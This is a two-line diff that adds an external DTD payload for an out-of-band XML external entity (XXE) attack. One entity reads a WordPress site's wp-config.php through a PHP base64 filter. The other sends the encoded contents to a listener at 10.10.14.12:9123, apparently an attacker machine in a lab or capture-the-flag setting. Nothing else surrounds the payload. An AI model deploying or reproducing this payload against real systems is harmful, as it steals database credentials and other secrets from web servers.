@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
+<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.12:9123/?p=%file;'>" >
